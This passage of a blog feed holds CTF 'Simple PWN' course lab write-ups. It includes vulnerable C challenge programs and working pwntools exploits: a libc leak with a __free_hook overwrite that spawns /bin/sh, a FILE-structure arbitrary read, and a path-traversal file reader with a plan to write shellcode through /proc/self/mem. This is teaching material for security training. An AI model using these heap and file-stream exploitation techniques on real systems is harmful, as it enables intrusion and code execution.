&lt;img src="https://imgur.com/u2Wy9xw.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

struct Note
{
 char name[0x10];
 void *data;
};

struct Note *notes[0x10];

static short int get_idx()
{
 short int idx;

 printf(&amp;#34;index\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;idx);

 if (idx &amp;gt;= 0x10)
 printf(&amp;#34;no, no ...\n&amp;#34;), exit(1);
 
 return idx;
}

static short int get_size()
{
 short int size;

 printf(&amp;#34;size\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;size);
 
 return size;
}

void add_note()
{
 short int idx;

 idx = get_idx();
 notes[idx] = malloc(sizeof(*notes[idx]));

 printf(&amp;#34;note name\n&amp;gt; &amp;#34;);
 read(0, notes[idx]-&amp;gt;name, 0x10);

 notes[idx]-&amp;gt;data = NULL;
 printf(&amp;#34;success!\n&amp;#34;);
}

void edit_data()
{
 short int idx;
 short int size;

 idx = get_idx();
 size = get_size();

 if (notes[idx]-&amp;gt;data == NULL)
 notes[idx]-&amp;gt;data = malloc(size);
 
 read(0, notes[idx]-&amp;gt;data, size);
 printf(&amp;#34;success!\n&amp;#34;);
}

void del_note()
{
 short int idx;

 idx = get_idx();
 free(notes[idx]-&amp;gt;data);
 free(notes[idx]);
 printf(&amp;#34;success!\n&amp;#34;);
}

void show_notes()
{
 for (int i = 0; i &amp;lt; 0x10; i++) {
 if (notes[i] == NULL || notes[i]-&amp;gt;data == NULL)
 continue;
 
 printf(&amp;#34;[%d] %s\ndata: %s\n&amp;#34;, i, notes[i]-&amp;gt;name, (char *)notes[i]-&amp;gt;data);
 }
}

int main()
{
 char opt[2];

 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);

 while (1)
 {
 printf(&amp;#34;1. add_note\n&amp;#34;
 &amp;#34;2. edit_data\n&amp;#34;
 &amp;#34;3. del_note\n&amp;#34;
 &amp;#34;4. show_notes\n&amp;#34;
 &amp;#34;5. bye\n&amp;#34;
 &amp;#34;&amp;gt; &amp;#34;);
 read(0, opt, 2);

 switch (opt[0]) {
 case &amp;#39;1&amp;#39;: add_note(); break;
 case &amp;#39;2&amp;#39;: edit_data(); break;
 case &amp;#39;3&amp;#39;: del_note(); break;
 case &amp;#39;4&amp;#39;: show_notes(); break;
 case &amp;#39;5&amp;#39;: exit(0);
 }
 }
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x19(Lab - `babyums` - flag 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/</guid><description>&lt;h1 id="simple-pwn-0x19lab---babyums---flag-1">
 Simple PWN 0x19(Lab - &lt;code>babyums&lt;/code> - flag 1)
 &lt;a class="anchor" href="#simple-pwn-0x19lab---babyums---flag-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#define FLAG1 &amp;#34;flag{XXXXXXXX}&amp;#34;

struct User
{
 char name[0x10];
 char password[0x10];
 void *data;
};

struct User *users[8];

static short int get_idx()
{
 short int idx;

 printf(&amp;#34;index\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;idx);

 if (idx &amp;gt;= 8)
 printf(&amp;#34;no, no ...&amp;#34;), exit(1);
 
 return idx;
}

static short int get_size()
{
 short int size;

 printf(&amp;#34;size\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;size);

 if (size &amp;gt;= 0x500)
 printf(&amp;#34;no, no ...&amp;#34;), exit(1);
 
 return size;
}

void add_user()
{
 short int idx;

 idx = get_idx();
 users[idx] = malloc(sizeof(*users[idx]));

 printf(&amp;#34;username\n&amp;gt; &amp;#34;);
 read(0, users[idx]-&amp;gt;name, 0x10);

 printf(&amp;#34;password\n&amp;gt; &amp;#34;);
 read(0, users[idx]-&amp;gt;password, 0x10);

 users[idx]-&amp;gt;data = NULL;
 printf(&amp;#34;success!\n&amp;#34;);
}

void edit_data()
{
 short int idx;
 short int size;

 idx = get_idx();
 size = get_size();

 if (users[idx]-&amp;gt;data == NULL)
 users[idx]-&amp;gt;data = malloc(size);
 
 read(0, users[idx]-&amp;gt;data, size);
 printf(&amp;#34;success!\n&amp;#34;);
}

void del_user()
{
 short int idx;

 idx = get_idx();
 free(users[idx]-&amp;gt;data);
 free(users[idx]);
 printf(&amp;#34;success!\n&amp;#34;);
}

void show_users()
{
 for (int i = 0; i &amp;lt; 8; i++) {
 if (users[i] == NULL || users[i]-&amp;gt;data == NULL)
 continue;
 
 printf(&amp;#34;[%d] %s\ndata: %s\n&amp;#34;, i, users[i]-&amp;gt;name, (char *)users[i]-&amp;gt;data);
 }
}

void add_admin()
{
 users[0] = malloc(sizeof(*users[0]));
 strcpy(users[0]-&amp;gt;name, &amp;#34;admin&amp;#34;);
 strcpy(users[0]-&amp;gt;password, FLAG1);
 users[0]-&amp;gt;data = NULL;
}

int main()
{
 char opt[2];
 int power = 20;

 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);

 printf(&amp;#34;**** User Management System ****\n&amp;#34;);
 add_admin();

 while (power)
 {
 power--;
 printf(&amp;#34;1. add_user\n&amp;#34;
 &amp;#34;2. edit_data\n&amp;#34;
 &amp;#34;3. del_user\n&amp;#34;
 &amp;#34;4. show_users\n&amp;#34;
 &amp;#34;5. bye\n&amp;#34;
 &amp;#34;&amp;gt; &amp;#34;);
 read(0, opt, 2);

 switch (opt[0]) {
 case &amp;#39;1&amp;#39;: add_user(); break;
 case &amp;#39;2&amp;#39;: edit_data(); break;
 case &amp;#39;3&amp;#39;: del_user(); break;
 case &amp;#39;4&amp;#39;: show_users(); break;
 case &amp;#39;5&amp;#39;: exit(0);
 }
 }
 printf(&amp;#34;No... no power..., b..ye...\n&amp;#34;);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x20(Lab - `babyums` - flag 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/</guid><description>&lt;h1 id="simple-pwn-0x20lab---babyums---flag-2">
 Simple PWN 0x20(Lab - &lt;code>babyums&lt;/code> - flag 2)
 &lt;a class="anchor" href="#simple-pwn-0x20lab---babyums---flag-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/2bR8lalySvKfA7Zr8DOhuA">Simple PWN 0x19(Lab - &lt;code>babyums&lt;/code> - flag 1)&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Very similar in this article: &lt;a href="https://bernie6401.github.io/zj3FTgxZQ22EgRPn1KHUSg">0x18(Lab - &lt;code>babynote&lt;/code>)&lt;/a>
:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

# r = process(&amp;#39;./chal&amp;#39;)
r = remote(&amp;#39;edu-ctf.zoolab.org&amp;#39;, 10008)

context.arch = &amp;#39;amd64&amp;#39;

def add_user(idx, user_name, user_passwd):
 r.sendafter(b&amp;#39;&amp;gt; &amp;#39;, b&amp;#39;1&amp;#39;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))
 r.sendafter(b&amp;#39;username\n&amp;gt; &amp;#39;, user_name)
 r.sendafter(b&amp;#39;password\n&amp;gt; &amp;#39;, user_passwd)

def edit_data(idx, note_size, message):
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;2&amp;#34;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))
 r.sendlineafter(b&amp;#39;size\n&amp;gt; &amp;#39;, str(note_size))
 r.send(message)

def del_user(idx):
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;3&amp;#34;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))

def show_user():
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;4&amp;#34;)


&amp;#39;&amp;#39;&amp;#39;------------------
Construct heap memory
------------------&amp;#39;&amp;#39;&amp;#39;
add_user(0, b&amp;#39;a&amp;#39;*8, b&amp;#39;aaaa&amp;#39;)
edit_data(0, 0x418, b&amp;#39;a&amp;#39;)

add_user(1, b&amp;#39;b&amp;#39;*8, b&amp;#39;bbbb&amp;#39;)
edit_data(1, 0x18, b&amp;#39;b&amp;#39;)

add_user(2, b&amp;#39;c&amp;#39;*8, b&amp;#39;cccc&amp;#39;)

&amp;#39;&amp;#39;&amp;#39;------------------
Leak libc address
------------------&amp;#39;&amp;#39;&amp;#39;
del_user(0)
show_user()
r.recvuntil(b&amp;#39;data:&amp;#39;)
libc = (u64(r.recv(8)) &amp;gt;&amp;gt; 8) - 0x1ecbe0 - 0xa000000000000
info(f&amp;#34;libc address: {hex(libc)}&amp;#34;)
free_hook_addr = libc + 0x1eee48
info(f&amp;#34;__free_hook address: {hex(free_hook_addr)}&amp;#34;)
libc_sys_addr = libc + 0x52290
info(f&amp;#34;__libc_system address: {hex(libc_sys_addr)}&amp;#34;)

&amp;#39;&amp;#39;&amp;#39;------------------
Construct fake chunk
------------------&amp;#39;&amp;#39;&amp;#39;
data = b&amp;#39;/bin/sh\x00&amp;#39;.ljust(0x10, b&amp;#39;b&amp;#39;)
fake_chunk = flat(
 0, 0x31,
 b&amp;#39;cccccccc&amp;#39;, b&amp;#39;cccccccc&amp;#39;,
 b&amp;#39;cccccccc&amp;#39;, b&amp;#39;cccccccc&amp;#39;,
 free_hook_addr
)

edit_data(1, 0x48, data + fake_chunk)
edit_data(2, 0x8, p64(libc_sys_addr))
del_user(1)

r.interactive()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x21(fopen, fread, fwrite, fclose)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/</guid><description>&lt;h1 id="simple-pwn-0x21fopen-fread-fwrite-fclose">
 Simple PWN 0x21(fopen, fread, fwrite, fclose)
 &lt;a class="anchor" href="#simple-pwn-0x21fopen-fread-fwrite-fclose">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler fopen&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 fp = fopen(&amp;#34;./test&amp;#34;, &amp;#34;r&amp;#34;);
 fclose(fp);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;p>:::spoiler fread&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 char buf[0x10];

 fp = fopen(&amp;#34;./test&amp;#34;, &amp;#34;r&amp;#34;);
 fread(buf, 0x1, 0x10, fp);
 fclose(fp);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;p>:::spoiler fwrite&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 char buf[0x10] = &amp;#34;TEST!!&amp;#34;;

 fp = fopen(&amp;#34;./test_write&amp;#34;, &amp;#34;r&amp;#34;);
 fread(buf, 0x1, 0x10, fp);
 fclose(fp);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x22(Lab - `AAR`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/</guid><description>&lt;h1 id="simple-pwn-0x22lab---aar">
 Simple PWN 0x22(Lab - &lt;code>AAR&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x22lab---aar">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x10] = &amp;#34;FLAG{TEST}\n&amp;#34;;

int main()
{
 FILE *fp;
 char *buf;

 buf = malloc(0x10);
 fp = fopen(&amp;#34;/tmp/meow&amp;#34;, &amp;#34;w&amp;#34;);
 read(0, buf, 0x1000);
 fwrite(buf, 0x10, 1, fp);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;h2 id="exploit---heap-overflow--overlap-flag">
 Exploit - heap overflow + overlap flag
 &lt;a class="anchor" href="#exploit---heap-overflow--overlap-flag">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

# r = process(&amp;#39;./chal&amp;#39;)
r = remote(&amp;#39;edu-ctf.zoolab.org&amp;#39;, 10010)

context.arch = &amp;#39;amd64&amp;#39;

flag_addr = 0x404050

raw_input()
payload = flat(
 p64(0)*4,
 p64(0xfbad0800), #_flags
 p64(0), #_IO_read_ptr
 p64(flag_addr), #_IO_read_end
 p64(0), #_IO_read_base
 p64(flag_addr), #_IO_write_base
 p64(flag_addr+0x10), #_IO_write_ptr
 p64(0)*8, #_IO_write_end + _IO_buf_base + _IO_buf_end + _chain
 p64(0x1) #_fileno
)

r.send(payload)

r.interactive()
&lt;/code>&lt;/pre></description></item><item><title>Simple PWN 0x23(Lab - `AAW`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/</guid><description>&lt;h1 id="simple-pwn-0x23lab---aaw">
 Simple PWN 0x23(Lab - &lt;code>AAW&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x23lab---aaw">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x10] = &amp;#34;FLAG{TEST}\n&amp;#34;;
char owo[] = &amp;#34;OWO!&amp;#34;;

int main()
{
 FILE *fp;
 char *buf;

 buf = malloc(0x10);
 fp = fopen(&amp;#34;/tmp/meow&amp;#34;, &amp;#34;r&amp;#34;);
 read(0, buf, 0x1000);
 fread(buf, 0x10, 1, fp);

 if (strcmp(owo, &amp;#34;OWO!&amp;#34;) != 0)
 write(1, flag, sizeof(flag));

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x31(2023 HW - Notepad - Stage - 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/</guid><description>&lt;h1 id="simple-pwn-0x312023-hw---notepad---stage---1">
 Simple PWN 0x31(2023 HW - Notepad - Stage - 1)
 &lt;a class="anchor" href="#simple-pwn-0x312023-hw---notepad---stage---1">#&lt;/a>
&lt;/h1>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>nc 10.113.184.121 10044&lt;/p>
&lt;p>You should solve the PoW to invoke a new instance.
You can use the pow_solver.py script in the released zip to solve the PoW.
After you solve the PoW, the service will create a new container and show &amp;gt;you the port. Connect it to play this challenge!
The container will be destroy at 5 minutes. So you should debug your exploit in your environment.&lt;/p></description></item><item><title>Simple PWN 0x32(2023 HW - Notepad-Stage 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/</guid><description>&lt;h1 id="simple-pwn-0x322023-hw---notepad-stage-2">
 Simple PWN 0x32(2023 HW - Notepad-Stage 2)
 &lt;a class="anchor" href="#simple-pwn-0x322023-hw---notepad-stage-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Try to get /flag_backend.&lt;/p>
&lt;p>Hint1: The only intended vulnerability in the frontend (notepad) is the path traversal.
Hint2: Try to write the shellcode into process memory by the path traversal vulnerability.&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>:::success
Special Thanks @cs-otaku For the most of the Inspiration of the WP
:::&lt;/p>
&lt;ul>
&lt;li>Recap
在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">read_any_file&lt;/span>(file_name):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;../../../../../../&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> (&lt;span style="color:#ae81ff">89&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(file_name)) &lt;span style="color:#f92672">+&lt;/span> file_name
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(&lt;span style="color:#66d9ef">True&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#f92672">=&lt;/span> dealing_cmd(r, &lt;span style="color:#ae81ff">5&lt;/span>, payload, offset&lt;span style="color:#f92672">=&lt;/span>str(offset)&lt;span style="color:#f92672">.&lt;/span>encode())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print(ret, len(ret))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ret &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Read note failed.&amp;#39;&lt;/span> &lt;span style="color:#f92672">and&lt;/span> ret &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t open the file.&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#f92672">+=&lt;/span> ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> offset &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>success(res)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> res
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>==漏洞發想==
透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下&lt;a href="http://blog.coderhuo.tech/2017/10/12/Virtual_Memory_C_strings_proc/">虛擬內存探究 &amp;ndash; 第一篇:C strings &amp;amp; /proc&lt;/a>，要做的事情和我們的幾乎一樣，簡單說就是&lt;/p></description></item><item><title>Simple PWN 0x33(2023 Lab - ROP_RW)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/</guid><description>&lt;h1 id="simple-pwn-0x332023-lab---rop_rw">
 Simple PWN 0x33(2023 Lab - ROP_RW)
 &lt;a class="anchor" href="#simple-pwn-0x332023-lab---rop_rw">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>ROP chain&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> flag[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> empty_buf[&lt;span style="color:#ae81ff">0x30&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">check&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>input)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> pass[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> output[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pass)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)input)[i] &lt;span style="color:#f92672">^&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (strcmp(pass, &lt;span style="color:#e6db74">&amp;#34;kyoumokawaii&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
